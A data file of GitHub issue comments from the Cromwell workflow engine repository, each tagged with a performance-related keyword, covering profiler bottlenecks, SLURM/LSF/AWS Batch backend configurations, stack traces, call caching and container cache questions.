Performance,"Got a chance to look w/ a profiler. Situation definitely *is* improved over previous in that I had to dramatically increase the size of the scatter to get hung up again (this is on my laptop which is apparently way faster than whatever machine @yfarjoun is using). The new bottleneck appears to be ExecutionStore.arePrerequisitesDone, sitting at 99% and growing CPU usage. Specifically the `exists` call in ExecutionStore.isDone and the collect on `key.scope.upstream`. . Note that `isDone` was also the previous hotspot but it doesn't appear to be the FQN calculation any more, rather just the `exists` itself. . It's possible that there's still something we can do a la the FQN here but if not my concern is that this is going to take you into the ""something clever"" realm. BTW @yfarjoun whatever machine you're running this on is also part of your bottleneck. I was able to do a 40k scatter no problem on one of my laptop cores, then just threw in 200k which is what locked it up. If you can't do 1k perhaps retry on something not from the stone age? ;)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277848692:273,bottleneck,bottleneck,273,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277848692,2,['bottleneck'],['bottleneck']
Performance,"Great, thanks. I originally saw this issue when running a 20000-wide Hello World scatter using mock JES. At a point when Cromwell temporarily seemed catatonic, I Control-backslashed and saw loads of engine dispatcher stack traces like the above. Mock JES is currently [broken](#1571) due to batching API changes but hopefully it will become great again soon and the #1456 changes can be validated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1445#issuecomment-254582826:190,load,loads,190,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1445#issuecomment-254582826,1,['load'],['loads']
Performance,"HI @markjschreiber,. Thanks for getting in touch. I had a look at the code and believe I came up with a work around, albeit a bit of a hack. Im building our system in Terraform so have a bit more control over the underlying infrastructure. Im able to mount additional volumes to the underlying ec2 instance, I just needed to mount them inside the container. I managed this with the following runner config:. backend {; default = AWSBatch; providers {; AWSBatch {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; ...; default-runtime-attributes {; queueArn: ""${default_batch_queue}""; scriptBucketName: ""${script_bucket}""; disks: ""local-disk,/bin/bash,${static_ref_snapshot_mount}""; zones: ""${aws_batch_availability_zone}""; }; }; }; }. Specifically `default-runtime-attributes.disks`. The first entry in this list always defaults to the working dir (this is the volume I have set up to autoscale), but after that subsequent values correspond to locations on the host. The only downside is that there is no way to change the mount location in the container. Whatever the location on the host has to be the same location in the container. As I control both I can make sure they are in sync. It feels a bit clunky but seems to be working. I will close this issue but would suggest some minor modifications to the AWS volume handling could really add to the systems flexibility /:-). Best,; Jon",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919472151:591,queue,queueArn,591,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919472151,1,['queue'],['queueArn']
Performance,"HPC; # Singularity+Slurm: and an example on Slurm; # udocker: another rootless container solution; # udocker+slurm: also exemplified on slurm; # HtCondor: workload manager at UW-Madison; # LSF: the Platform Load Sharing Facility backend; # SGE: Sun Grid Engine; # SLURM: workload manager. # Note that these other backend examples will need tweaking and configuration.; # Please open an issue https://www.github.com/broadinstitute/cromwell if you have any questions; slurm {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; # Root directory where Cromwell writes job results in the container. This value; # can be used to specify where the execution folder is mounted in the container.; # it is used for the construction of the docker_cwd string in the submit-docker; # value above.; dockerRoot = ""/cromwell-executions"". concurrent-job-limit = 10; # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; ## Warning: If set, Cromwell will run 'check-alive' for every job at this interval; exit-code-timeout-seconds = 360; filesystems {; local {; localization: [; # soft link does not work for docker with --contain. Hard links won't work; # across file systems; ""copy"", ""hard-link"", ""soft-link""; ]; caching {; duplication-strategy: [""copy"", ""hard-link"", ""soft-link""]; hashing-strategy: ""file""; }; }; }. #; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 3; Int requested_memory_mb_per_core = 8000; Int memory_mb = 40000; String? docker; String? partition; String? account; String? IMAGE; """""". submit = """"""; sbatch \; --wait \; --job-name=${job_name} \; --chdir=${cwd} \; --output=${out} \; --error=${err} \; --time=${runtime_minutes} \; ${""--cpus-per-task="" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --partition=wzhcexclu06 \; --wrap ""/b",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:6544,concurren,concurrent-job-limit,6544,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['concurren'],['concurrent-job-limit']
Performance,"Had a brief chat w/ @dshiga - I was wondering if all slowness was directly tied to reading from metadata or general slowness and it was the latter (not that it couldn't be _caused_ by reading from MD, but it's across the board slowness). Three thoughts:; - We were talking yesterday about how someone not named me should try setting up typesafe monitor and use it to debug/profile/analyze. No time like the present!; - I can't find the ticket (@kcibul - do you know the right string to search for?) but we should look into the thread pools/dispatchers. This could be a case where something is bringing down the whole system but bulkheading would keep everything else responsive; - A while back we talked about streamlining submission such that WF submissions get a ""Submitted"" status but aren't necessarily immediately launched, and the system would pull them - allowing us to tune the rate at which we pull. Perhaps time to resurrect this one?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228412772:877,tune,tune,877,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228412772,2,['tune'],['tune']
Performance,"Happened again last night:. ```; The code passed to eventually never returned normally. Attempted 30 times over 3.33454509745 minutes. Last failure message: isEmpty was false, and Some(false) did not contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp).; ```. ```; org.scalatest.exceptions.TestFailedDueToTimeoutException: The code passed to eventually never returned normally. Attempted 30 times over 3.33454509745 minutes. Last failure message: isEmpty was false, and Some(false) did not contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp).; at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:432); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.eventually(HealthMonitorServiceActorSpec.scala:20); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.eventualStatus(HealthMonitorServiceActorSpec.scala:32); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$new$5(HealthMonitorServiceActorSpec.scala:81); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.FlatSpecLike$$anon$1.apply(FlatSpecLike.scala:1682); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.withFixture(HealthMonitorServiceActorSpec.scala:20); at org.scalatest.FlatSpecLike.invokeWithFixture$1(FlatSpecLike.scala:1680); at org.scalatest.FlatSpecLike.$anonfun$runTest$1(FlatSpecLike.scala:1692); at org.scalatest.Su",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:662,concurren,concurrent,662,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,3,['concurren'],['concurrent']
Performance,Happens on a small set of workflows but not others. From the logs of the offending Cromwell:. ```; #011at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); #011at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); #011at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); #011at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); #011at akka.dispatch.Mailbox.exec(Mailbox.scala:234); #011at akka.dispatch.Mailbox.run(Mailbox.scala:224); #011at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); #011at akka.actor.ActorCell.invoke(ActorCell.scala:495); #011at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); #011at cromwell.webservice.PerRequest$WithProps.aroundReceive(PerRequest.scala:97); #011at akka.actor.Actor$class.aroundReceive(Actor.scala:496); #011at cromwell.webservice.PerRequest$$anonfun$receive$1.applyOrElse(PerRequest.scala:41); #011at cromwell.webservice.PerRequest$class.cromwell$webservice$PerRequest$$complete(PerRequest.scala:58); #011at spray.routing.RequestContext.complete(RequestContext.scala:237); #011at spray.httpx.marshalling.ToResponseMarshaller$$anon$3.apply(Marshaller.scala:81); #011at spray.httpx.marshalling.ToResponseMarshaller$$anonfun$compose$1.apply(Marshaller.scala:69); #011at spray.httpx.marshalling.ToResponseMarshaller$$anonfun$compose$1.apply(Marshaller.scala:69); #011at spray.httpx.marshalling.BasicToResponseMarshallers$$anon$1.apply(BasicToResponseMarshallers.scala:22); #011at spray.httpx.marshalling.BasicToResponseMarshallers$$anon$1.apply(BasicToResponseMarshallers.scala:35); #011at spray.httpx.marshalling.Marshaller$$anon$2.apply(Marshaller.scala:47); #011at spray.httpx.marshalling.Marshaller$MarshallerDelegation$$anonfun$apply$2.apply(Marshaller.scala:60); #011at spray.httpx.marshalling.Marshaller$MarshallerDelegation$$anonfun$apply$2.apply(Marshaller.scala:61); #011at spray.httpx.marshalling.Marshaller$MarshallerDele,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2438:112,concurren,concurrent,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2438,4,['concurren'],['concurrent']
Performance,"Has there been any further discussion about this issue? Our team was also recently hit by a large egress charge for inter-continent docker image pulls by Cromwell -- we'd really like to be able set our image repositories to requester-pays to prevent that. . Having Cromwell/PAPI cache images would also really help to mitigate the problem -- similarly to @freeseek our workflow is structured to scatter some steps quite widely, so one relatively small workflow run can currently result in hundreds of docker pulls of the same image.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884262789:279,cache,cache,279,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884262789,1,['cache'],['cache']
Performance,"Have you run this under heavy load? If so, how does it react?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2026#issuecomment-282294665:30,load,load,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2026#issuecomment-282294665,1,['load'],['load']
Performance,"Heh, fair point :). I just meant that it's probably not worth worrying about optimizing stuff around submission (although there are other aspects at play here besides submission) since itll need to be changed around soon anyways",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-201106013:77,optimiz,optimizing,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-201106013,1,['optimiz'],['optimizing']
Performance,"Hello - @vsoch has pointed me over here, and reminded me of https://github.com/hpcng/singularity/issues/5309 which I'll respond to shortly. It may be useful to note here that in the forthcoming singularity 3.6 the cache functionality is rewritten to drop the additional directory structure and stuff that caused race conditions. We now fetch cache entries to a tmp name, and rename - so assuming the filesystem the the cache dir is on supports atomic rename there shouldn't be concurrency issues. This will not prevent the need to work around it here for older singularity versions, though.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-636151836:214,cache,cache,214,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-636151836,5,"['cache', 'concurren', 'race condition']","['cache', 'concurrency', 'race conditions']"
Performance,"Hello @ruchim :-). The Spark job will run just as good in Yarn as in Mesos, I am pretty sure about that. Main difference is that Mesos is much more advanced than Yarn. It is more scalable, both in terms of nr of nodes, nr of jobs, and types of jobs and applications. . In Mesos, you can run both normal applications (web apps etc.), like you do in Kubernetes, and you can run compute / Big Data processing jobs in the same cluster. You can schedule both cpu and memory usage, not only memory usage as in Yarn. Mesos creates a virtual operating system on top of your cluster, kind of. Yarn is not capable of that as I know it. You can even run Yarn and Kubernetes on top of Mesos etc. Choosing Mesos over Yarn, will therefor make sense for many companies, because you get one system to rule them all. It might add more complexity also though ... I am a bit dated on this, Yarn might have evolved since I looked at it. This article is good at explaining the difference:. https://www.oreilly.com/ideas/a-tale-of-two-clusters-mesos-and-yarn. Here is a nice summary of the main differences:; https://data-flair.training/blogs/comparison-between-apache-mesos-vs-hadoop-yarn/. Hope this give some answers :-)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3461#issuecomment-417230977:179,scalab,scalable,179,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3461#issuecomment-417230977,1,['scalab'],['scalable']
Performance,"Hello I am trying to re-use an existing workflow for Mutect2 available here: https://app.terra.bio/#workspaces/terra-outreach/CHIP-Detection-Mutect2 to run on SLURM with Singularity configuration. There are multiple steps similar to Mutect2 public workflow available here: https://github.com/broadinstitute/gatk/blob/master/scripts/mutect2_wdl/mutect2.wdl , but still attaching the modified WDL with additional steps. . So when we run this with the given configuration using the following; export SINGULARITY_CACHEDIR=$PWD/singularity_cache; export SINGULARITY_TMPDIR=$PWD/tmpdir; module load singularity; rm -rf nohup.out && nohup java -Dconfig.file=$PWD/cromwell_singularity.conf -jar $PWD/cromwell-84.jar run $PWD/mutect2_modified.wdl --inputs $PWD/inputs.json &. The issue is that the first step of splitting intervals runs fine, but as it starts mutect2, it starts copying of the complete execution directory making here is the directory structure. cromwell-executions/; └── Mutect2; └── e5769b79-5e02-44a5-a4f8-38745e152beb; ├── call-M2; │ └── shard-0; │ ├── execution; │ └── inputs; │ ├── -1816294717; │ ├── 1855713868; │ │ └── run_cromwell_only.tmp; │ │ └── cromwell-executions; │ │ └── Mutect2; │ │ └── e5769b79-5e02-44a5-a4f8-38745e152beb; │ ├── 2035192126; │ └── 891763929; └── call-SplitIntervals; ├── execution; │ ├── glob-0fc990c5ca95eebc97c4c204e3e303e1; │ └── interval-files; ├── inputs; │ └── -1816294717; └── tmp.c9d96672. As you can see that run_cromwell_only.tmp is being made and that happens to fall in an endless loop and eventually, it errors stating the file name is too long to copy. Can you help me how to avoid this behavior of making circular paths when copying files for execution? Also, note it does not happen in the first step of SplitIntervals but happens in the Mutect2 call. [mutect2_gatk.wdl.txt](https://github.com/broadinstitute/cromwell/files/9813528/mutect2_gatk.wdl.txt); [cromwell_singularity.conf.txt](https://github.com/broadinstitute/cromwell/files/981352",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6934:588,load,load,588,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6934,1,['load'],['load']
Performance,"Hello! I am trying to create a submit-docker block for use with docker containers, according to instructions from [here](https://cromwell.readthedocs.io/en/stable/tutorials/Containers/). This is the how my config block looks:. ```; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpu = 1; Int requested_memory_mb_per_core = 8000; Int memory_mb = 4000; String queue = ""short""; String? docker; """""". submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} \; ${""-c "" + cpu} \; --mem ${memory_mb} \; --wrap ""/bin/bash ${script}""; """"""; ; submit-docker = """"""; docker pull ${docker}. sbatch -J ${job_name} -D ${cwd} -o ${cwd}/execution/stdout -e ${cwd}/execution/stderr -t ${runtime_minutes} -p ${queue} \; ${""-c "" + cpu} \; --mem ${memory_mb} \; --wrap ""docker run -v ${cwd}:${docker_cwd} ${docker} ${job_shell} ${script}""; """""". kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; ```; But, I get an error from each node:. /bin/bash: /data/og/wgs/cromwell-executions/HaplotypeCallerGvcf_GATK4/98c2fe18-92b7-49d4-b490-623ed61e3dfc/call-HaplotypeCaller/shard-41/execution/script: No such file or directory. As far as I can tell, it is trying to reach the script local on the main machine, and not in the docker container. Is this expected behavior, or am I missing something? I know I can replace ${script} with ${docker_cwd}/execution/script but I am unsure why I need this change that is not according to your documentation. Thanks!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5768:474,queue,queue,474,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5768,3,['queue'],['queue']
Performance,"Hello, I executed the following workflow using chromwell behind a proxy . $ java \; -Djava.net.useSystemProxies=true \; -Dhttp.proxyHost=202.241.78.237 -Dhttp.proxyPort=8080 \; -Dhttps.proxyHost=202.241.78.237 -Dhttps.proxyPort=8080 \; -jar cromwell-85.jar run public_health_bacterial_genomics/workflows/wf_theiaprok_illumina_pe.wdl -i input.json. but it caused the following error, indicating connection with quay.io/50.17.122.58:443 timed out. 2023-05-11 10:01:42,43] [info] Request threw an exception on attempt #1. Retrying after 596 milliseconds; org.http4s.client.ConnectionFailure: Error connecting to https://quay.io using address quay.io:443 (unresolved: false); at org.http4s.client.blaze.Http1Support.$anonfun$buildPipeline$1(Http1Support.scala:90); at scala.concurrent.impl.Promise$Transformation.run(Promise.scala:477); at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128); at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628); at java.base/java.lang.Thread.run(Thread.java:834); at async @ org.http4s.internal.package$.$anonfun$fromFuture$1(package.scala:144); at flatMap @ org.http4s.internal.package$.fromFuture(package.scala:139); at flatMap @ org.http4s.client.PoolManager.$anonfun$createConnection$2(PoolManager.scala:119); at shift @ org.http4s.client.PoolManager.$anonfun$createConnection$2(PoolManager.scala:119); at uncancelable @ org.http4s.client.ConnectionManager$.pool(ConnectionManager.scala:83); at unsafeRunSync @ cromwell.docker.DockerInfoActor.preStart(DockerInfoActor.scala:172); Caused by: java.net.SocketTimeoutException: An attempt to establish connection with quay.io/50.17.122.58:443 timed out after 10 seconds.; at org.http4s.blaze.channel.nio2.ClientChannelFactory$$anon$1.run(ClientChannelFactory.scala:66); at org.http4s.blaze.util.Execution$$anon$3.execute(Execution.scala:80); at org.http4s.blaze.util.TickWheelExecutor$Node.run(TickWheelExecutor.scala:271); at org.http4s.blaz",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7136:770,concurren,concurrent,770,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7136,3,['concurren'],['concurrent']
Performance,"Hello, I'm cross-posting this issue from the GATK git since it doesn't seem to be active. I'm encountering the following issue with Cromwell:. cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed: Unable to load namespace from workflow: Failed to import workflow SomaticPairedSingleSampleWf.wdl.: File not found /wdl_runner/SomaticPairedSingleSampleWf.wdl at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$MaterializeWorkflowDescriptorActor$$workflowInitializationFailed(MaterializeWorkflowDescriptorActor.scala:186) at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$2.applyOrElse(MaterializeWorkflowDescriptorActor.scala:156) at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$2.applyOrElse(MaterializeWorkflowDescriptorActor.scala:151) at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34) at akka.actor.FSM.processEvent(FSM.scala:663) at akka.actor.FSM.processEvent$(FSM.scala:660) at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.akka$actor$LoggingFSM$$super$processEvent(MaterializeWorkflowDescriptorActor.scala:114) at akka.actor.LoggingFSM.processEvent(FSM.scala:799) at akka.actor.LoggingFSM.processEvent$(FSM.scala:781) at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.processEvent(MaterializeWorkflowDescriptorActor.scala:114) at akka.actor.FSM.akka$actor$FSM$$processMsg(FSM.scala:657) at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:651) at akka.actor.Actor.aroundReceive(Actor.scala:513) at akka.actor.Actor.aroundReceive$(Actor.scala:511) at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.aroundReceive(MaterializeWorkflowDescriptorActor.scala:114) at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527) at akka.actor.ActorCell.invoke(ActorCell.scala:496) at akka.dispatch.Mailbox.processMailb",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4482:266,load,load,266,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4482,1,['load'],['load']
Performance,"Hello, and apologies if this is not the correct place for this query. Cromwell engine version 46. We are currently looking at a Proof of Concept with Cromwell and AWS batch.; We trying to understand the **CallCaching** trigger(s), as we require this if the next step in a multi-step workflow breaks. Currently, we have set up the in-memory version and are not using any form of database. We have added the following to the configuration file:; `call-caching {; enabled = true; invalidate-bad-cache-results = true; }`. **Question 1.**. Can call caching be initiated if there is only the in-memory database, as below is not clear regarding this?; _""Cromwell's call cache is maintained in its database. In order for call caching to be used on any previously run jobs, it is best to configure Cromwell to point to a MySQL database instead of the default in-memory database. This way any invocation of Cromwell (either with run or server subcommands) will be able to utilize results from all calls that are in that database.""_. Secondly, if this can. **Question 2.**. Can call caching be initiated if a scatter, wraps a workflow, which then wraps tools.; Or will the entire workflow need to be in one script? (I have attached an example as zip); And, the options file.; [DsTrim - Broken.zip](https://github.com/broadinstitute/cromwell/files/3842334/DsTrim.-.Broken.zip). **Question 3.**. What exactly triggers callcaching to change from ""CallCachingOff"" to on, in the following result?; `; ""callCaching"": {; ""effectiveCallCachingMode"": ""CallCachingOff"",; ""allowResultReuse"": false,; ""hit"": false,; ""result"": ""Cache Miss""; },`. **If the in-memory is the issue, then please close and we will set-up a UAT correctly.; If not any additional assistance or comments will be most apprecitated.** . ###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create iss",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5280:492,cache,cache-results,492,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5280,2,['cache'],"['cache', 'cache-results']"
Performance,"Hello,. I posted a couple of issues on the bcbio-nextgen tracker and I thought I'd link them here as well, in case anyone can help, as these seem to be Cromwell-specific errors. Running bcbio-nextgen with IPython parallel instead of Cromwell works fine for the scenario I've set up. In summary, I'm trying to run variant calling with bcbio-nextgen using Cromwell and 100 small FASTQ files (50-100 reads each), for testing, on an SGE cluster. The main issue seems to be that the master node is coming up under heavy load, for some reason, and, at some point, the Cromwell jobs stop getting scheduled. . This is described in more detail here: https://github.com/bcbio/bcbio-nextgen/issues/2721. A second issue, which might be related, is with the file `cromwell_work/persist/metadata.lobs`. It gets quite big, at 36 GB, for the scenario that I've described earlier, and I'm wondering if this is normal. . I'm also seeing some error messages (`java.sql.BatchUpdateException: lob is no longer valid`) when running bcbio-nextgen with Cromwell, in the same scenario as above. Could this somehow be related to the high cluster load issues as well? . More details are here: https://github.com/bcbio/bcbio-nextgen/issues/2722.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4732:515,load,load,515,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4732,2,['load'],['load']
Performance,"Hello,. I'm running a Cromwell service as Google Cloud VM instance. The Cromwell's version is 68, with the following conf:. ```; include required(classpath(""application"")). webservice {; interface = xx.xxx.xxx.xx; port = xxxx; }. google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. engine {; filesystems {; gcs {; auth = ""application-default""; project = ""gred-cumulus-sb-01-991a49c4""; }. }; }. workflow-options {; workflow-log-temporary = false; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.cj.jdbc.Driver""; 	url = ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true""; 	user = ""root""; 	password = ""cromwell""; 	connectionTimeout = 5000; }; }. backend {; default = PAPIv2. providers {; PAPIv2 {; actor-factory = ""cromwell.backend.google.pipelines.v2alpha1.PipelinesApiLifecycleActorFactory""; config {; # Google project; project = ""gred-cumulus-sb-01-991a49c4"". # Base bucket for workflow executions; root = ""gs://gred-cumulus-output/cromwell_execution"". virtual-private-cloud {; network-label-key = ""my-private-network""; subnetwork-label-key = ""my-private-subnetwork""; auth = ""application-default""; }. # Make the name of the backend used for call caching purposes insensitive to the PAPI version.; name-for-call-caching-purposes: PAPI. # Emit a warning if jobs last longer than this amount of time. This might indicate that something got stuck in PAPI.; slow-job-warning-time: ""24 hours"". # Set this to the lower of the two values ""Queries per 100 seconds"" and ""Queries per 100 seconds per user"" for; # your project.; #; # Used to help determine maximum throughput to the Google Genomics API. Setting this value too low will; # cause a drop in performance. Setting this value too high will cause QPS based locks from Google.; # 1000 is the default ""Queries per 100 seconds per user"", 50000 is the default ""Querie",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6506:570,cache,cache-results,570,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6506,1,['cache'],['cache-results']
Performance,"Hello,. I'm wondering if cromwell has support for loading environment modules somehow? I need to port the same workflow between AWS (so, the docker runtime attribute is handy) and a slurm cluster (which uses module environment). Can they be specified as a runtime parameter for example? Can they be part of the configuration file to cromwell? If yes, any suggestions as to how?. Thank you, ; Azza",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4997:50,load,loading,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4997,1,['load'],['loading']
Performance,"Hello,. when I try to run my workflow using a config file using. `$ java -Dconfig.file=../config/LSF.conf cromwell.jar cromwell run ../pipelines/bismark_pid.wdl -i ../pipelines/bismark_wgbs_pid.json`. I get the following message; ```; Error: Could not find or load main class cromwell.jar; Caused by: java.lang.ClassNotFoundException: cromwell.jar; ```. Without specifying a config file, the pipeline runs without any problems. ; I installed Cromwell (version 79) using conda. I also tried the following:. `$ java -Dconfig.file=../config/LSF.conf cromwell-79.jar run ../pipelines/bismark_pid.wdl -i ../pipelines/bismark_wgbs_pid.json `. ```; Error: Could not find or load main class cromwell-79.jar; Caused by: java.lang.ClassNotFoundException: cromwell-79.jar; ```. I also checked where the cromwell.jar file is saved in my conda environment and tried the following:. `; java -Dconfig.file=./LSF.conf /path/to/env/share/cromwell/cromwell.jar cromwell run ../pipelines/bismark_pid.wdl -i ../pipelines/bismark_wgbs_pid.json `. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. This is the config file LSF.config:; ```; include required(classpath(""application"")). backend {. # Override the default backend.; default = LSF. # The list of providers. Copy paste the contents of a backend provider in this section; providers {; LSF {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; 	submit = ""bsub -J ${job_name} -cwd ${cwd} -o ${out} -e ${err} /usr/bin/env bash ${script}""; kill = ""bkill ${job_id}""; check-alive = ""bjobs ${job_id}""; job-id-regex = ""Job <(\\d+)>.*""; }; }; # Second backend provider would be copy pasted here!. }; }; ```. I have not much experienced with cromwell and would be very grateful for help. Thank you,; Johannes",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6796:260,load,load,260,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6796,2,['load'],['load']
Performance,"Here is an example for cromwell.conf backend for AWS-EFS or any shared mountable file system for AWSBATCH.; Please make sure you mount the EFS to /your-root on cromwell-server host and batch-computes.; One way of doing this automatically is thro' a LaunchTemplate. . backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 10; numCreateDefinitionAttempts = 10; root = ""/your-root/cromwell_execution""; auth = ""default""; default-runtime-attributes { queueArn = ""xxxx"" }; filesystems { local { auth = ""default"" } }; }; }; }",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-585500837:562,queue,queueArn,562,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-585500837,1,['queue'],['queueArn']
